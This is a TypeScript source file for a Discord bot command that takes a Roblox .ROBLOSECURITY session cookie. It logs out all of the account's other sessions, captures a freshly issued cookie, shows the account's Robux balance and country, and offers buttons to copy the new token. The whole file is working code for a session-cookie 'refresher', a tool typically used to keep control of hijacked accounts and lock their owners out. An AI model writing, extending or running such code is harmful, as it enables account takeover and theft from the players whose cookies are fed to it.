import {
  SlashCommandBuilder,
  PermissionFlagsBits,
  ActionRowBuilder,
  ButtonBuilder,
  ButtonStyle,
  EmbedBuilder,
  type ChatInputCommandInteraction,
  type MessageComponentInteraction,
} from 'discord.js';
import axios from 'axios';
import { wrapper } from 'axios-cookiejar-support';
import { CookieJar } from 'tough-cookie';
import type { Command } from './types';

const cookieStore = new Map<string, string>();

function buildResetButtons(id: string): ActionRowBuilder<ButtonBuilder> {
  return new ActionRowBuilder<ButtonBuilder>().addComponents(
    new ButtonBuilder()
      .setCustomId(`reset_copypc_${id}`)
      .setLabel('💻 Copy PC')
      .setStyle(ButtonStyle.Secondary),
    new ButtonBuilder()
      .setCustomId(`reset_copymob_${id}`)
      .setLabel('📱 Copy Mobile')
      .setStyle(ButtonStyle.Secondary),
  );
}

async function fetchRobux(cookie: string, userId: string): Promise<number> {
  try {
    const resp = await axios.get(
      `https://economy.roblox.com/v1/users/${userId}/currency`,
      { headers: { Cookie: `.ROBLOSECURITY=${cookie}` }, validateStatus: () => true, timeout: 10000 }
    );
    if (resp.status === 200 && resp.data?.robux !== undefined) return resp.data.robux;
  } catch {}
  return 0;
}

async function fetchCountry(cookie: string): Promise<string> {
  try {
    const resp = await fetch('https://accountsettings.roblox.com/v1/account/settings/account-country', {
      headers: { Cookie: `.ROBLOSECURITY=${cookie}` },
    });
    if (resp.status === 200) {
      const data = await resp.json() as { value: { countryName: string } };
      return data.value?.countryName || 'Unknown';
    }
  } catch {}
  return 'Unknown';
}

async function validateCookieWithRetry(cookie: string, maxAttempts = 3): Promise<{ valid: boolean; userId?: string; username?: string; error?: string }> {
  for (let attempt = 1; attempt <= maxAttempts; attempt++) {
    try {
      const cleanCookie = cookie.trim();
      const jar = new CookieJar();
      await jar.setCookie(`.ROBLOSECURITY=${cleanCookie}; Domain=.roblox.com; Path=/`, 'https://users.roblox.com');
      const client = wrapper(axios.create({ jar }));
      const resp = await client.get('https://users.roblox.com/v1/users/authenticated', {
        headers: {
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
          'Cookie': `.ROBLOSECURITY=${cleanCookie}`,
        },
        validateStatus: () => true,
        timeout: 15000,
      });
      if (resp.status === 200) {
        return { valid: true, userId: String(resp.data.id), username: resp.data.name };
      }
      if (resp.status === 401) return { valid: false, error: '401 Unauthorized' };
    } catch (err: any) {
      if (attempt === maxAttempts) return { valid: false, error: err.message };
      await new Promise(resolve => setTimeout(resolve, 1000));
    }
  }
  return { valid: false, error: 'All validation attempts failed' };
}

function extractNewCookie(jar: CookieJar): string | null {
  try {
    const cookies = jar.getCookiesSync('https://roblox.com');
    const robloCookie = cookies.find(c => c.key === '.ROBLOSECURITY');
    if (robloCookie) {
      try { return decodeURIComponent(robloCookie.value); } catch { return robloCookie.value; }
    }
  } catch {}
  return null;
}

async function processLogoutAll(cookie: string) {
  try {
    const cleanCookie = cookie.trim();
    const jar = new CookieJar();
    await jar.setCookie(`.ROBLOSECURITY=${cleanCookie}; Domain=.roblox.com; Path=/`, 'https://roblox.com');
    const client = wrapper(axios.create({ jar }));
    const headers: Record<string, string> = {
      'Content-Type': 'application/json',
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
      'Origin': 'https://www.roblox.com',
      'Referer': 'https://www.roblox.com/',
      'Cookie': `.ROBLOSECURITY=${cleanCookie}`,
    };

    const url = 'https://auth.roblox.com/v2/logoutfromallsessionsandreauthenticate';
    let newCookie: string | null = null;
    let authResp;

    for (let attempt = 0; attempt < 3; attempt++) {
      authResp = await client.post(url, {}, { headers, validateStatus: () => true });

      if (authResp.status === 403) {
        const csrf = authResp.headers['x-csrf-token'];
        if (csrf) {
          headers['X-CSRF-TOKEN'] = csrf;
          authResp = await client.post(url, {}, { headers, validateStatus: () => true });
        }
      }

      if (authResp.status === 200) {
        newCookie = extractNewCookie(jar);
        if (!newCookie && authResp.headers['set-cookie']) {
          const rawSetCookie = Array.isArray(authResp.headers['set-cookie'])
            ? authResp.headers['set-cookie'].join(';')
            : authResp.headers['set-cookie'];
          const match = rawSetCookie.match(/\.ROBLOSECURITY=([^;]+)/);
          if (match) newCookie = match[1];
        }
        if (newCookie) break;
      }
      await new Promise(resolve => setTimeout(resolve, 3000));
    }

    if (!newCookie || authResp?.status !== 200) {
      return { success: false, newCookie: null };
    }

    const validation = await validateCookieWithRetry(newCookie);
    if (!validation.valid) {
      return { success: false, newCookie: null };
    }

    const [robux, country] = await Promise.all([
      fetchRobux(newCookie, validation.userId!),
      fetchCountry(newCookie),
    ]);

    let thumbnailUrl = '';
    try {
      const thumbResp = await client.get(
        `https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${validation.userId}&size=150x150&format=Png&isCircular=false`,
        { validateStatus: () => true }
      );
      if (thumbResp.status === 200 && thumbResp.data.data.length > 0) {
        thumbnailUrl = thumbResp.data.data[0].imageUrl;
      }
    } catch {}

    return {
      success: true,
      newCookie,
      username: validation.username || 'Unknown',
      userId: validation.userId || 'Unknown',
      robux,
      country,
      thumbnailUrl,
    };
  } catch {
    return { success: false, newCookie: null };
  }
}

const data = new SlashCommandBuilder()
  .setName('reset')
  .setDescription('Reset Cookie Session')
  .setDefaultMemberPermissions(PermissionFlagsBits.Administrator)
  .addStringOption(opt => opt.setName('cookie').setDescription('The .ROBLOSECURITY cookie').setRequired(true)) as SlashCommandBuilder;

async function execute(interaction: ChatInputCommandInteraction): Promise<void> {
  try {
    await interaction.deferReply({ ephemeral: true });

    const oldCookie = interaction.options.getString('cookie', true);
    const timestamp = new Date().toLocaleString();
    const footerData = { text: `${interaction.user.username} | ${timestamp}`, iconURL: interaction.user.displayAvatarURL() };

    const progressEmbed = new EmbedBuilder()
      .setTitle('𖣐 Processing .ᐟ')
      .setColor('#FFFFFF')
      .setDescription('✧ **Status:** Validating cookie...\n────\n⭑ Checking session authenticity with Roblox servers.')
      .setFooter(footerData);

    await interaction.editReply({ embeds: [progressEmbed] });

    const validation = await validateCookieWithRetry(oldCookie);
    if (!validation.valid) {
      const embed = new EmbedBuilder()
        .setTitle('𖣐 Invalid Cookie .ᐟ')
        .setColor('#FFFFFF')
        .setDescription(`✧ **Error Occurred**\n────\n⭑ ${validation.error || 'Cookie invalid or expired.'}`)
        .setFooter(footerData);
      await interaction.editReply({ embeds: [embed] });
      return;
    }

    progressEmbed.setDescription('✧ **Status:** Refreshing session...\n────\n⭑ Logging out all active sessions and generating a secure cookie.');
    await interaction.editReply({ embeds: [progressEmbed] });

    const result = await processLogoutAll(oldCookie);

    if (result.success && result.newCookie) {
      const id = Math.random().toString(36).slice(2, 10);
      cookieStore.set(id, result.newCookie);
      setTimeout(() => cookieStore.delete(id), 300000);

      const embed = new EmbedBuilder()
        .setTitle('𖣐 Success .ᐟ')
        .setColor('#FFFFFF')
        .setDescription(
          `✧ **User Information**\n` +
          `────\n` +
          `⭑ **Username:** ${result.username}\n` +
          `⭑ **User ID:** ${result.userId}\n` +
          `⭑ **Country:** ${result.country || 'Unknown'}\n` +
          `💰 **Robux:** ${result.robux.toLocaleString()} ₽\n` +
          `────\n` +
          `✧ **Account Details**\n` +
          `────\n` +
          `⭑ **Action:** Logout All Sessions`
        )
        .setImage('https://files.catbox.moe/955g15.gif')
        .setFooter(footerData);

      if (result.thumbnailUrl) embed.setThumbnail(result.thumbnailUrl);

      await interaction.editReply({ embeds: [embed], components: [buildResetButtons(id)] });
    } else {
      const embed = new EmbedBuilder()
        .setTitle('𖣐 Failed .ᐟ')
        .setColor('#FFFFFF')
        .setDescription('✧ **Error Occurred**\n────\n⭑ The request failed or the cookie was rejected by the server.')
        .setFooter(footerData);
      await interaction.editReply({ embeds: [embed], components: [] });
    }
  } catch (error: any) {
    const embed = new EmbedBuilder()
      .setTitle('𖣐 Error .ᐟ')
      .setColor('#FFFFFF')
      .setDescription(`✧ **Unexpected Error**\n────\n⭑ ${error.message || 'Something went wrong.'}`)
      .setFooter({ text: `${interaction.user.username} | ${new Date().toLocaleString()}`, iconURL: interaction.user.displayAvatarURL() });
    await interaction.editReply({ embeds: [embed] });
  }
}

async function handleButton(interaction: MessageComponentInteraction): Promise<void> {
  try {
    const customId = interaction.customId;
    if (!customId.startsWith('reset_')) return;
    const parts = customId.split('_');
    const action = parts[1];
    const id = parts[2];
    const cookie = cookieStore.get(id);
    if (!cookie) {
      await interaction.reply({ content: '𖣐 This button has expired. Please run the command again.', ephemeral: true });
      return;
    }
    if (action === 'copypc') {
      await interaction.reply({ content: `\`\`\`\n${cookie}\n\`\`\``, ephemeral: true });
    } else if (action === 'copymob') {
      await interaction.reply({ content: `\`${cookie}\``, ephemeral: true });
    }
  } catch (error: any) {
    await interaction.reply({ content: `𖣐 Error: ${error.message || 'Something went wrong.'}`, ephemeral: true });
  }
}

export const resetCommand: Command = { data, execute, handleButton };